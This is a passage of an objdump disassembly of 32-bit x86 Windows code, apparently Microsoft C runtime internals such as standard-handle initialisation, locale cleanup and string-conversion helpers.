  405e8a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405e8d:	3b fe                	cmp    %esi,%edi
  405e8f:	75 ad                	jne    0x405e3e
  405e91:	5f                   	pop    %edi
  405e92:	5e                   	pop    %esi
  405e93:	5b                   	pop    %ebx
  405e94:	8b e5                	mov    %ebp,%esp
  405e96:	5d                   	pop    %ebp
  405e97:	c3                   	ret
  405e98:	8b ff                	mov    %edi,%edi
  405e9a:	53                   	push   %ebx
  405e9b:	56                   	push   %esi
  405e9c:	57                   	push   %edi
  405e9d:	33 ff                	xor    %edi,%edi
  405e9f:	8b c7                	mov    %edi,%eax
  405ea1:	8b cf                	mov    %edi,%ecx
  405ea3:	83 e0 3f             	and    $0x3f,%eax
  405ea6:	c1 f9 06             	sar    $0x6,%ecx
  405ea9:	6b f0 30             	imul   $0x30,%eax,%esi
  405eac:	03 34 8d 50 40 41 00 	add    0x414050(,%ecx,4),%esi
  405eb3:	83 7e 18 ff          	cmpl   $0xffffffff,0x18(%esi)
  405eb7:	74 0c                	je     0x405ec5
  405eb9:	83 7e 18 fe          	cmpl   $0xfffffffe,0x18(%esi)
  405ebd:	74 06                	je     0x405ec5
  405ebf:	80 4e 28 80          	orb    $0x80,0x28(%esi)
  405ec3:	eb 7b                	jmp    0x405f40
  405ec5:	8b c7                	mov    %edi,%eax
  405ec7:	c6 46 28 81          	movb   $0x81,0x28(%esi)
  405ecb:	83 e8 00             	sub    $0x0,%eax
  405ece:	74 10                	je     0x405ee0
  405ed0:	83 e8 01             	sub    $0x1,%eax
  405ed3:	74 07                	je     0x405edc
  405ed5:	6a f4                	push   $0xfffffff4
  405ed7:	83 e8 01             	sub    $0x1,%eax
  405eda:	eb 06                	jmp    0x405ee2
  405edc:	6a f5                	push   $0xfffffff5
  405ede:	eb 02                	jmp    0x405ee2
  405ee0:	6a f6                	push   $0xfffffff6
  405ee2:	58                   	pop    %eax
  405ee3:	50                   	push   %eax
  405ee4:	ff 15 dc c0 40 00    	call   *0x40c0dc
  405eea:	8b d8                	mov    %eax,%ebx
  405eec:	83 fb ff             	cmp    $0xffffffff,%ebx
  405eef:	74 0d                	je     0x405efe
  405ef1:	85 db                	test   %ebx,%ebx
  405ef3:	74 09                	je     0x405efe
  405ef5:	53                   	push   %ebx
  405ef6:	ff 15 28 c1 40 00    	call   *0x40c128
  405efc:	eb 02                	jmp    0x405f00
  405efe:	33 c0                	xor    %eax,%eax
  405f00:	85 c0                	test   %eax,%eax
  405f02:	74 1e                	je     0x405f22
  405f04:	25 ff 00 00 00       	and    $0xff,%eax
  405f09:	89 5e 18             	mov    %ebx,0x18(%esi)
  405f0c:	83 f8 02             	cmp    $0x2,%eax
  405f0f:	75 06                	jne    0x405f17
  405f11:	80 4e 28 40          	orb    $0x40,0x28(%esi)
  405f15:	eb 29                	jmp    0x405f40
  405f17:	83 f8 03             	cmp    $0x3,%eax
  405f1a:	75 24                	jne    0x405f40
  405f1c:	80 4e 28 08          	orb    $0x8,0x28(%esi)
  405f20:	eb 1e                	jmp    0x405f40
  405f22:	80 4e 28 40          	orb    $0x40,0x28(%esi)
  405f26:	c7 46 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%esi)
  405f2d:	a1 84 42 41 00       	mov    0x414284,%eax
  405f32:	85 c0                	test   %eax,%eax
  405f34:	74 0a                	je     0x405f40
  405f36:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  405f39:	c7 40 10 fe ff ff ff 	movl   $0xfffffffe,0x10(%eax)
  405f40:	47                   	inc    %edi
  405f41:	83 ff 03             	cmp    $0x3,%edi
  405f44:	0f 85 55 ff ff ff    	jne    0x405e9f
  405f4a:	5f                   	pop    %edi
  405f4b:	5e                   	pop    %esi
  405f4c:	5b                   	pop    %ebx
  405f4d:	c3                   	ret
  405f4e:	6a 0c                	push   $0xc
  405f50:	68 a8 18 41 00       	push   $0x4118a8
  405f55:	e8 b6 c1 ff ff       	call   0x402110
  405f5a:	6a 07                	push   $0x7
  405f5c:	e8 ff f6 ff ff       	call   0x405660
  405f61:	59                   	pop    %ecx
  405f62:	33 db                	xor    %ebx,%ebx
  405f64:	88 5d e7             	mov    %bl,-0x19(%ebp)
  405f67:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  405f6a:	53                   	push   %ebx
  405f6b:	e8 99 fc ff ff       	call   0x405c09
  405f70:	59                   	pop    %ecx
  405f71:	85 c0                	test   %eax,%eax
  405f73:	75 0f                	jne    0x405f84
  405f75:	e8 68 fe ff ff       	call   0x405de2
  405f7a:	e8 19 ff ff ff       	call   0x405e98
  405f7f:	b3 01                	mov    $0x1,%bl
  405f81:	88 5d e7             	mov    %bl,-0x19(%ebp)
  405f84:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405f8b:	e8 0b 00 00 00       	call   0x405f9b
  405f90:	8a c3                	mov    %bl,%al
  405f92:	e8 bf c1 ff ff       	call   0x402156
  405f97:	c3                   	ret
  405f98:	8a 5d e7             	mov    -0x19(%ebp),%bl
  405f9b:	6a 07                	push   $0x7
  405f9d:	e8 06 f7 ff ff       	call   0x4056a8
  405fa2:	59                   	pop    %ecx
  405fa3:	c3                   	ret
  405fa4:	8b ff                	mov    %edi,%edi
  405fa6:	56                   	push   %esi
  405fa7:	33 f6                	xor    %esi,%esi
  405fa9:	8b 86 50 40 41 00    	mov    0x414050(%esi),%eax
  405faf:	85 c0                	test   %eax,%eax
  405fb1:	74 0e                	je     0x405fc1
  405fb3:	50                   	push   %eax
  405fb4:	e8 1b fc ff ff       	call   0x405bd4
  405fb9:	83 a6 50 40 41 00 00 	andl   $0x0,0x414050(%esi)
  405fc0:	59                   	pop    %ecx
  405fc1:	83 c6 04             	add    $0x4,%esi
  405fc4:	81 fe 00 02 00 00    	cmp    $0x200,%esi
  405fca:	72 dd                	jb     0x405fa9
  405fcc:	b0 01                	mov    $0x1,%al
  405fce:	5e                   	pop    %esi
  405fcf:	c3                   	ret
  405fd0:	8b ff                	mov    %edi,%edi
  405fd2:	55                   	push   %ebp
  405fd3:	8b ec                	mov    %esp,%ebp
  405fd5:	51                   	push   %ecx
  405fd6:	e8 4f e3 ff ff       	call   0x40432a
  405fdb:	8b 48 4c             	mov    0x4c(%eax),%ecx
  405fde:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  405fe1:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  405fe4:	51                   	push   %ecx
  405fe5:	50                   	push   %eax
  405fe6:	e8 8c 12 00 00       	call   0x407277
  405feb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405fee:	59                   	pop    %ecx
  405fef:	59                   	pop    %ecx
  405ff0:	8b 00                	mov    (%eax),%eax
  405ff2:	8b e5                	mov    %ebp,%esp
  405ff4:	5d                   	pop    %ebp
  405ff5:	c3                   	ret
  405ff6:	8b ff                	mov    %edi,%edi
  405ff8:	55                   	push   %ebp
  405ff9:	8b ec                	mov    %esp,%ebp
  405ffb:	56                   	push   %esi
  405ffc:	8b 75 08             	mov    0x8(%ebp),%esi
  405fff:	85 f6                	test   %esi,%esi
  406001:	0f 84 ea 00 00 00    	je     0x4060f1
  406007:	8b 46 0c             	mov    0xc(%esi),%eax
  40600a:	3b 05 54 36 41 00    	cmp    0x413654,%eax
  406010:	74 07                	je     0x406019
  406012:	50                   	push   %eax
  406013:	e8 f5 dd ff ff       	call   0x403e0d
  406018:	59                   	pop    %ecx
  406019:	8b 46 10             	mov    0x10(%esi),%eax
  40601c:	3b 05 58 36 41 00    	cmp    0x413658,%eax
  406022:	74 07                	je     0x40602b
  406024:	50                   	push   %eax
  406025:	e8 e3 dd ff ff       	call   0x403e0d
  40602a:	59                   	pop    %ecx
  40602b:	8b 46 14             	mov    0x14(%esi),%eax
  40602e:	3b 05 5c 36 41 00    	cmp    0x41365c,%eax
  406034:	74 07                	je     0x40603d
  406036:	50                   	push   %eax
  406037:	e8 d1 dd ff ff       	call   0x403e0d
  40603c:	59                   	pop    %ecx
  40603d:	8b 46 18             	mov    0x18(%esi),%eax
  406040:	3b 05 60 36 41 00    	cmp    0x413660,%eax
  406046:	74 07                	je     0x40604f
  406048:	50                   	push   %eax
  406049:	e8 bf dd ff ff       	call   0x403e0d
  40604e:	59                   	pop    %ecx
  40604f:	8b 46 1c             	mov    0x1c(%esi),%eax
  406052:	3b 05 64 36 41 00    	cmp    0x413664,%eax
  406058:	74 07                	je     0x406061
  40605a:	50                   	push   %eax
  40605b:	e8 ad dd ff ff       	call   0x403e0d
  406060:	59                   	pop    %ecx
  406061:	8b 46 20             	mov    0x20(%esi),%eax
  406064:	3b 05 68 36 41 00    	cmp    0x413668,%eax
  40606a:	74 07                	je     0x406073
  40606c:	50                   	push   %eax
  40606d:	e8 9b dd ff ff       	call   0x403e0d
  406072:	59                   	pop    %ecx
  406073:	8b 46 24             	mov    0x24(%esi),%eax
  406076:	3b 05 6c 36 41 00    	cmp    0x41366c,%eax
  40607c:	74 07                	je     0x406085
  40607e:	50                   	push   %eax
  40607f:	e8 89 dd ff ff       	call   0x403e0d
  406084:	59                   	pop    %ecx
  406085:	8b 46 38             	mov    0x38(%esi),%eax
  406088:	3b 05 80 36 41 00    	cmp    0x413680,%eax
  40608e:	74 07                	je     0x406097
  406090:	50                   	push   %eax
  406091:	e8 77 dd ff ff       	call   0x403e0d
  406096:	59                   	pop    %ecx
  406097:	8b 46 3c             	mov    0x3c(%esi),%eax
  40609a:	3b 05 84 36 41 00    	cmp    0x413684,%eax
  4060a0:	74 07                	je     0x4060a9
  4060a2:	50                   	push   %eax
  4060a3:	e8 65 dd ff ff       	call   0x403e0d
  4060a8:	59                   	pop    %ecx
  4060a9:	8b 46 40             	mov    0x40(%esi),%eax
  4060ac:	3b 05 88 36 41 00    	cmp    0x413688,%eax
  4060b2:	74 07                	je     0x4060bb
  4060b4:	50                   	push   %eax
  4060b5:	e8 53 dd ff ff       	call   0x403e0d
  4060ba:	59                   	pop    %ecx
  4060bb:	8b 46 44             	mov    0x44(%esi),%eax
  4060be:	3b 05 8c 36 41 00    	cmp    0x41368c,%eax
  4060c4:	74 07                	je     0x4060cd
  4060c6:	50                   	push   %eax
  4060c7:	e8 41 dd ff ff       	call   0x403e0d
  4060cc:	59                   	pop    %ecx
  4060cd:	8b 46 48             	mov    0x48(%esi),%eax
  4060d0:	3b 05 90 36 41 00    	cmp    0x413690,%eax
  4060d6:	74 07                	je     0x4060df
  4060d8:	50                   	push   %eax
  4060d9:	e8 2f dd ff ff       	call   0x403e0d
  4060de:	59                   	pop    %ecx
  4060df:	8b 46 4c             	mov    0x4c(%esi),%eax
  4060e2:	3b 05 94 36 41 00    	cmp    0x413694,%eax
  4060e8:	74 07                	je     0x4060f1
  4060ea:	50                   	push   %eax
  4060eb:	e8 1d dd ff ff       	call   0x403e0d
  4060f0:	59                   	pop    %ecx
  4060f1:	5e                   	pop    %esi
  4060f2:	5d                   	pop    %ebp
  4060f3:	c3                   	ret
  4060f4:	8b ff                	mov    %edi,%edi
  4060f6:	55                   	push   %ebp
  4060f7:	8b ec                	mov    %esp,%ebp
  4060f9:	56                   	push   %esi
  4060fa:	8b 75 08             	mov    0x8(%ebp),%esi
  4060fd:	85 f6                	test   %esi,%esi
  4060ff:	74 59                	je     0x40615a
  406101:	8b 06                	mov    (%esi),%eax
  406103:	3b 05 48 36 41 00    	cmp    0x413648,%eax
  406109:	74 07                	je     0x406112
  40610b:	50                   	push   %eax
  40610c:	e8 fc dc ff ff       	call   0x403e0d
  406111:	59                   	pop    %ecx
  406112:	8b 46 04             	mov    0x4(%esi),%eax
  406115:	3b 05 4c 36 41 00    	cmp    0x41364c,%eax
  40611b:	74 07                	je     0x406124
  40611d:	50                   	push   %eax
  40611e:	e8 ea dc ff ff       	call   0x403e0d
  406123:	59                   	pop    %ecx
  406124:	8b 46 08             	mov    0x8(%esi),%eax
  406127:	3b 05 50 36 41 00    	cmp    0x413650,%eax
  40612d:	74 07                	je     0x406136
  40612f:	50                   	push   %eax
  406130:	e8 d8 dc ff ff       	call   0x403e0d
  406135:	59                   	pop    %ecx
  406136:	8b 46 30             	mov    0x30(%esi),%eax
  406139:	3b 05 78 36 41 00    	cmp    0x413678,%eax
  40613f:	74 07                	je     0x406148
  406141:	50                   	push   %eax
  406142:	e8 c6 dc ff ff       	call   0x403e0d
  406147:	59                   	pop    %ecx
  406148:	8b 46 34             	mov    0x34(%esi),%eax
  40614b:	3b 05 7c 36 41 00    	cmp    0x41367c,%eax
  406151:	74 07                	je     0x40615a
  406153:	50                   	push   %eax
  406154:	e8 b4 dc ff ff       	call   0x403e0d
  406159:	59                   	pop    %ecx
  40615a:	5e                   	pop    %esi
  40615b:	5d                   	pop    %ebp
  40615c:	c3                   	ret
  40615d:	8b ff                	mov    %edi,%edi
  40615f:	55                   	push   %ebp
  406160:	8b ec                	mov    %esp,%ebp
  406162:	8b 45 0c             	mov    0xc(%ebp),%eax
  406165:	53                   	push   %ebx
  406166:	56                   	push   %esi
  406167:	8b 75 08             	mov    0x8(%ebp),%esi
  40616a:	57                   	push   %edi
  40616b:	33 ff                	xor    %edi,%edi
  40616d:	8d 04 86             	lea    (%esi,%eax,4),%eax
  406170:	8b c8                	mov    %eax,%ecx
  406172:	2b ce                	sub    %esi,%ecx
  406174:	83 c1 03             	add    $0x3,%ecx
  406177:	c1 e9 02             	shr    $0x2,%ecx
  40617a:	3b c6                	cmp    %esi,%eax
  40617c:	1b db                	sbb    %ebx,%ebx
  40617e:	f7 d3                	not    %ebx
  406180:	23 d9                	and    %ecx,%ebx
  406182:	74 10                	je     0x406194
  406184:	ff 36                	push   (%esi)
  406186:	e8 82 dc ff ff       	call   0x403e0d
  40618b:	47                   	inc    %edi
  40618c:	8d 76 04             	lea    0x4(%esi),%esi
  40618f:	59                   	pop    %ecx
  406190:	3b fb                	cmp    %ebx,%edi
  406192:	75 f0                	jne    0x406184
  406194:	5f                   	pop    %edi
  406195:	5e                   	pop    %esi
  406196:	5b                   	pop    %ebx
  406197:	5d                   	pop    %ebp
  406198:	c3                   	ret
  406199:	8b ff                	mov    %edi,%edi
  40619b:	55                   	push   %ebp
  40619c:	8b ec                	mov    %esp,%ebp
  40619e:	56                   	push   %esi
  40619f:	8b 75 08             	mov    0x8(%ebp),%esi
  4061a2:	85 f6                	test   %esi,%esi
  4061a4:	0f 84 d0 00 00 00    	je     0x40627a
  4061aa:	6a 07                	push   $0x7
  4061ac:	56                   	push   %esi
  4061ad:	e8 ab ff ff ff       	call   0x40615d
  4061b2:	8d 46 1c             	lea    0x1c(%esi),%eax
  4061b5:	6a 07                	push   $0x7
  4061b7:	50                   	push   %eax
  4061b8:	e8 a0 ff ff ff       	call   0x40615d
  4061bd:	8d 46 38             	lea    0x38(%esi),%eax
  4061c0:	6a 0c                	push   $0xc
  4061c2:	50                   	push   %eax
  4061c3:	e8 95 ff ff ff       	call   0x40615d
  4061c8:	8d 46 68             	lea    0x68(%esi),%eax
  4061cb:	6a 0c                	push   $0xc
  4061cd:	50                   	push   %eax
  4061ce:	e8 8a ff ff ff       	call   0x40615d
  4061d3:	8d 86 98 00 00 00    	lea    0x98(%esi),%eax
  4061d9:	6a 02                	push   $0x2
  4061db:	50                   	push   %eax
  4061dc:	e8 7c ff ff ff       	call   0x40615d
  4061e1:	ff b6 a0 00 00 00    	push   0xa0(%esi)
  4061e7:	e8 21 dc ff ff       	call   0x403e0d
  4061ec:	ff b6 a4 00 00 00    	push   0xa4(%esi)
  4061f2:	e8 16 dc ff ff       	call   0x403e0d
  4061f7:	ff b6 a8 00 00 00    	push   0xa8(%esi)
  4061fd:	e8 0b dc ff ff       	call   0x403e0d
  406202:	8d 86 b4 00 00 00    	lea    0xb4(%esi),%eax
  406208:	6a 07                	push   $0x7
  40620a:	50                   	push   %eax
  40620b:	e8 4d ff ff ff       	call   0x40615d
  406210:	8d 86 d0 00 00 00    	lea    0xd0(%esi),%eax
  406216:	6a 07                	push   $0x7
  406218:	50                   	push   %eax
  406219:	e8 3f ff ff ff       	call   0x40615d
  40621e:	83 c4 44             	add    $0x44,%esp
  406221:	8d 86 ec 00 00 00    	lea    0xec(%esi),%eax
  406227:	6a 0c                	push   $0xc
  406229:	50                   	push   %eax
  40622a:	e8 2e ff ff ff       	call   0x40615d
  40622f:	8d 86 1c 01 00 00    	lea    0x11c(%esi),%eax
  406235:	6a 0c                	push   $0xc
  406237:	50                   	push   %eax
  406238:	e8 20 ff ff ff       	call   0x40615d
  40623d:	8d 86 4c 01 00 00    	lea    0x14c(%esi),%eax
  406243:	6a 02                	push   $0x2
  406245:	50                   	push   %eax
  406246:	e8 12 ff ff ff       	call   0x40615d
  40624b:	ff b6 54 01 00 00    	push   0x154(%esi)
  406251:	e8 b7 db ff ff       	call   0x403e0d
  406256:	ff b6 58 01 00 00    	push   0x158(%esi)
  40625c:	e8 ac db ff ff       	call   0x403e0d
  406261:	ff b6 5c 01 00 00    	push   0x15c(%esi)
  406267:	e8 a1 db ff ff       	call   0x403e0d
  40626c:	ff b6 60 01 00 00    	push   0x160(%esi)
  406272:	e8 96 db ff ff       	call   0x403e0d
  406277:	83 c4 28             	add    $0x28,%esp
  40627a:	5e                   	pop    %esi
  40627b:	5d                   	pop    %ebp
  40627c:	c3                   	ret
  40627d:	8b ff                	mov    %edi,%edi
  40627f:	55                   	push   %ebp
  406280:	8b ec                	mov    %esp,%ebp
  406282:	8b 45 08             	mov    0x8(%ebp),%eax
  406285:	33 c9                	xor    %ecx,%ecx
  406287:	53                   	push   %ebx
  406288:	56                   	push   %esi
  406289:	57                   	push   %edi
  40628a:	66 39 08             	cmp    %cx,(%eax)
  40628d:	74 2c                	je     0x4062bb
  40628f:	8b 75 0c             	mov    0xc(%ebp),%esi
  406292:	0f b7 3e             	movzwl (%esi),%edi
  406295:	8b ce                	mov    %esi,%ecx
  406297:	66 85 ff             	test   %di,%di
  40629a:	74 15                	je     0x4062b1
  40629c:	0f b7 18             	movzwl (%eax),%ebx
  40629f:	8b d7                	mov    %edi,%edx
  4062a1:	66 3b d3             	cmp    %bx,%dx
  4062a4:	74 17                	je     0x4062bd
  4062a6:	83 c1 02             	add    $0x2,%ecx
  4062a9:	0f b7 11             	movzwl (%ecx),%edx
  4062ac:	66 85 d2             	test   %dx,%dx
  4062af:	75 f0                	jne    0x4062a1
  4062b1:	83 c0 02             	add    $0x2,%eax
  4062b4:	33 c9                	xor    %ecx,%ecx
  4062b6:	66 39 08             	cmp    %cx,(%eax)
  4062b9:	75 da                	jne    0x406295
  4062bb:	33 c0                	xor    %eax,%eax
  4062bd:	5f                   	pop    %edi
  4062be:	5e                   	pop    %esi
  4062bf:	5b                   	pop    %ebx
  4062c0:	5d                   	pop    %ebp
  4062c1:	c3                   	ret
  4062c2:	8b ff                	mov    %edi,%edi
  4062c4:	55                   	push   %ebp
  4062c5:	8b ec                	mov    %esp,%ebp
  4062c7:	83 ec 18             	sub    $0x18,%esp
  4062ca:	a1 04 30 41 00       	mov    0x413004,%eax
  4062cf:	33 c5                	xor    %ebp,%eax
  4062d1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4062d4:	53                   	push   %ebx
  4062d5:	56                   	push   %esi
  4062d6:	57                   	push   %edi
  4062d7:	ff 75 08             	push   0x8(%ebp)
  4062da:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4062dd:	e8 53 dc ff ff       	call   0x403f35
  4062e2:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  4062e5:	85 c9                	test   %ecx,%ecx
  4062e7:	75 0b                	jne    0x4062f4
  4062e9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4062ec:	8b 40 08             	mov    0x8(%eax),%eax
  4062ef:	8b c8                	mov    %eax,%ecx
  4062f1:	89 45 1c             	mov    %eax,0x1c(%ebp)
  4062f4:	33 c0                	xor    %eax,%eax
  4062f6:	33 ff                	xor    %edi,%edi
  4062f8:	39 45 20             	cmp    %eax,0x20(%ebp)
  4062fb:	57                   	push   %edi
  4062fc:	57                   	push   %edi
  4062fd:	ff 75 14             	push   0x14(%ebp)
  406300:	0f 95 c0             	setne  %al
  406303:	ff 75 10             	push   0x10(%ebp)
  406306:	8d 04 c5 01 00 00 00 	lea    0x1(,%eax,8),%eax
  40630d:	50                   	push   %eax
  40630e:	51                   	push   %ecx
  40630f:	ff 15 e4 c0 40 00    	call   *0x40c0e4
  406315:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406318:	85 c0                	test   %eax,%eax
  40631a:	0f 84 99 00 00 00    	je     0x4063b9
  406320:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
  406323:	8d 4b 08             	lea    0x8(%ebx),%ecx
  406326:	3b d9                	cmp    %ecx,%ebx
  406328:	1b c0                	sbb    %eax,%eax
  40632a:	85 c1                	test   %eax,%ecx
  40632c:	74 4a                	je     0x406378
  40632e:	8d 4b 08             	lea    0x8(%ebx),%ecx
  406331:	3b d9                	cmp    %ecx,%ebx
  406333:	1b c0                	sbb    %eax,%eax
  406335:	23 c1                	and    %ecx,%eax
  406337:	8d 4b 08             	lea    0x8(%ebx),%ecx
  40633a:	3d 00 04 00 00       	cmp    $0x400,%eax
  40633f:	77 19                	ja     0x40635a
  406341:	3b d9                	cmp    %ecx,%ebx
  406343:	1b c0                	sbb    %eax,%eax
  406345:	23 c1                	and    %ecx,%eax
  406347:	e8 04 48 00 00       	call   0x40ab50
  40634c:	8b f4                	mov    %esp,%esi
  40634e:	85 f6                	test   %esi,%esi
  406350:	74 60                	je     0x4063b2
  406352:	c7 06 cc cc 00 00    	movl   $0xcccc,(%esi)
  406358:	eb 19                	jmp    0x406373
  40635a:	3b d9                	cmp    %ecx,%ebx
  40635c:	1b c0                	sbb    %eax,%eax
  40635e:	23 c1                	and    %ecx,%eax
  406360:	50                   	push   %eax
  406361:	e8 e1 da ff ff       	call   0x403e47
  406366:	8b f0                	mov    %eax,%esi
  406368:	59                   	pop    %ecx
  406369:	85 f6                	test   %esi,%esi
  40636b:	74 45                	je     0x4063b2
  40636d:	c7 06 dd dd 00 00    	movl   $0xdddd,(%esi)
  406373:	83 c6 08             	add    $0x8,%esi
  406376:	eb 02                	jmp    0x40637a
  406378:	8b f7                	mov    %edi,%esi
  40637a:	85 f6                	test   %esi,%esi
  40637c:	74 34                	je     0x4063b2
  40637e:	53                   	push   %ebx
  40637f:	57                   	push   %edi
  406380:	56                   	push   %esi
  406381:	e8 8a c1 ff ff       	call   0x402510
  406386:	83 c4 0c             	add    $0xc,%esp
  406389:	ff 75 f8             	push   -0x8(%ebp)
  40638c:	56                   	push   %esi
  40638d:	ff 75 14             	push   0x14(%ebp)
  406390:	ff 75 10             	push   0x10(%ebp)
  406393:	6a 01                	push   $0x1
  406395:	ff 75 1c             	push   0x1c(%ebp)
  406398:	ff 15 e4 c0 40 00    	call   *0x40c0e4
  40639e:	85 c0                	test   %eax,%eax
  4063a0:	74 10                	je     0x4063b2
  4063a2:	ff 75 18             	push   0x18(%ebp)
  4063a5:	50                   	push   %eax
  4063a6:	56                   	push   %esi
  4063a7:	ff 75 0c             	push   0xc(%ebp)
  4063aa:	ff 15 2c c1 40 00    	call   *0x40c12c
  4063b0:	8b f8                	mov    %eax,%edi
  4063b2:	56                   	push   %esi
  4063b3:	e8 27 00 00 00       	call   0x4063df
  4063b8:	59                   	pop    %ecx
  4063b9:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  4063bd:	74 0a                	je     0x4063c9
  4063bf:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4063c2:	83 a0 50 03 00 00 fd 	andl   $0xfffffffd,0x350(%eax)
  4063c9:	8b c7                	mov    %edi,%eax
  4063cb:	8d 65 dc             	lea    -0x24(%ebp),%esp
  4063ce:	5f                   	pop    %edi
  4063cf:	5e                   	pop    %esi
  4063d0:	5b                   	pop    %ebx
  4063d1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4063d4:	33 cd                	xor    %ebp,%ecx
  4063d6:	e8 ed b3 ff ff       	call   0x4017c8
  4063db:	8b e5                	mov    %ebp,%esp
  4063dd:	5d                   	pop    %ebp
  4063de:	c3                   	ret
  4063df:	8b ff                	mov    %edi,%edi
  4063e1:	55                   	push   %ebp
  4063e2:	8b ec                	mov    %esp,%ebp
  4063e4:	8b 45 08             	mov    0x8(%ebp),%eax
  4063e7:	85 c0                	test   %eax,%eax
  4063e9:	74 12                	je     0x4063fd
  4063eb:	83 e8 08             	sub    $0x8,%eax
  4063ee:	81 38 dd dd 00 00    	cmpl   $0xdddd,(%eax)
  4063f4:	75 07                	jne    0x4063fd
  4063f6:	50                   	push   %eax
  4063f7:	e8 11 da ff ff       	call   0x403e0d
  4063fc:	59                   	pop    %ecx
  4063fd:	5d                   	pop    %ebp
  4063fe:	c3                   	ret
  4063ff:	8b ff                	mov    %edi,%edi
  406401:	55                   	push   %ebp
  406402:	8b ec                	mov    %esp,%ebp
  406404:	8b 45 08             	mov    0x8(%ebp),%eax
  406407:	f0 ff 40 0c          	lock incl 0xc(%eax)
  40640b:	8b 48 7c             	mov    0x7c(%eax),%ecx
  40640e:	85 c9                	test   %ecx,%ecx
  406410:	74 03                	je     0x406415
  406412:	f0 ff 01             	lock incl (%ecx)
  406415:	8b 88 84 00 00 00    	mov    0x84(%eax),%ecx
  40641b:	85 c9                	test   %ecx,%ecx
  40641d:	74 03                	je     0x406422
  40641f:	f0 ff 01             	lock incl (%ecx)
  406422:	8b 88 80 00 00 00    	mov    0x80(%eax),%ecx
  406428:	85 c9                	test   %ecx,%ecx
  40642a:	74 03                	je     0x40642f
  40642c:	f0 ff 01             	lock incl (%ecx)
  40642f:	8b 88 8c 00 00 00    	mov    0x8c(%eax),%ecx
  406435:	85 c9                	test   %ecx,%ecx
  406437:	74 03                	je     0x40643c
  406439:	f0 ff 01             	lock incl (%ecx)
  40643c:	56                   	push   %esi
  40643d:	6a 06                	push   $0x6
  40643f:	8d 48 28             	lea    0x28(%eax),%ecx
  406442:	5e                   	pop    %esi
  406443:	81 79 f8 38 36 41 00 	cmpl   $0x413638,-0x8(%ecx)
  40644a:	74 09                	je     0x406455
  40644c:	8b 11                	mov    (%ecx),%edx
  40644e:	85 d2                	test   %edx,%edx
  406450:	74 03                	je     0x406455
  406452:	f0 ff 02             	lock incl (%edx)
  406455:	83 79 f4 00          	cmpl   $0x0,-0xc(%ecx)
  406459:	74 0a                	je     0x406465
  40645b:	8b 51 fc             	mov    -0x4(%ecx),%edx
  40645e:	85 d2                	test   %edx,%edx
  406460:	74 03                	je     0x406465
  406462:	f0 ff 02             	lock incl (%edx)
  406465:	83 c1 10             	add    $0x10,%ecx
  406468:	83 ee 01             	sub    $0x1,%esi
  40646b:	75 d6                	jne    0x406443
  40646d:	ff b0 9c 00 00 00    	push   0x9c(%eax)
  406473:	e8 4e 01 00 00       	call   0x4065c6
  406478:	59                   	pop    %ecx
  406479:	5e                   	pop    %esi
  40647a:	5d                   	pop    %ebp
  40647b:	c3                   	ret
  40647c:	8b ff                	mov    %edi,%edi
  40647e:	55                   	push   %ebp
  40647f:	8b ec                	mov    %esp,%ebp
  406481:	51                   	push   %ecx
  406482:	53                   	push   %ebx
  406483:	56                   	push   %esi
  406484:	8b 75 08             	mov    0x8(%ebp),%esi
  406487:	57                   	push   %edi
  406488:	8b 86 88 00 00 00    	mov    0x88(%esi),%eax
  40648e:	85 c0                	test   %eax,%eax
  406490:	74 6c                	je     0x4064fe
  406492:	3d 48 36 41 00       	cmp    $0x413648,%eax
  406497:	74 65                	je     0x4064fe
  406499:	8b 46 7c             	mov    0x7c(%esi),%eax
  40649c:	85 c0                	test   %eax,%eax
  40649e:	74 5e                	je     0x4064fe
  4064a0:	83 38 00             	cmpl   $0x0,(%eax)
  4064a3:	75 59                	jne    0x4064fe
  4064a5:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
  4064ab:	85 c0                	test   %eax,%eax
  4064ad:	74 18                	je     0x4064c7
  4064af:	83 38 00             	cmpl   $0x0,(%eax)
  4064b2:	75 13                	jne    0x4064c7
  4064b4:	50                   	push   %eax
  4064b5:	e8 53 d9 ff ff       	call   0x403e0d
  4064ba:	ff b6 88 00 00 00    	push   0x88(%esi)
  4064c0:	e8 31 fb ff ff       	call   0x405ff6
  4064c5:	59                   	pop    %ecx
  4064c6:	59                   	pop    %ecx
  4064c7:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  4064cd:	85 c0                	test   %eax,%eax
  4064cf:	74 18                	je     0x4064e9
  4064d1:	83 38 00             	cmpl   $0x0,(%eax)
  4064d4:	75 13                	jne    0x4064e9
  4064d6:	50                   	push   %eax
  4064d7:	e8 31 d9 ff ff       	call   0x403e0d
  4064dc:	ff b6 88 00 00 00    	push   0x88(%esi)
  4064e2:	e8 0d fc ff ff       	call   0x4060f4
  4064e7:	59                   	pop    %ecx
  4064e8:	59                   	pop    %ecx
  4064e9:	ff 76 7c             	push   0x7c(%esi)
  4064ec:	e8 1c d9 ff ff       	call   0x403e0d
  4064f1:	ff b6 88 00 00 00    	push   0x88(%esi)
  4064f7:	e8 11 d9 ff ff       	call   0x403e0d
  4064fc:	59                   	pop    %ecx
  4064fd:	59                   	pop    %ecx
  4064fe:	8b 86 8c 00 00 00    	mov    0x8c(%esi),%eax
  406504:	85 c0                	test   %eax,%eax
  406506:	74 45                	je     0x40654d
  406508:	83 38 00             	cmpl   $0x0,(%eax)
  40650b:	75 40                	jne    0x40654d
  40650d:	8b 86 90 00 00 00    	mov    0x90(%esi),%eax
  406513:	2d fe 00 00 00       	sub    $0xfe,%eax
  406518:	50                   	push   %eax
  406519:	e8 ef d8 ff ff       	call   0x403e0d
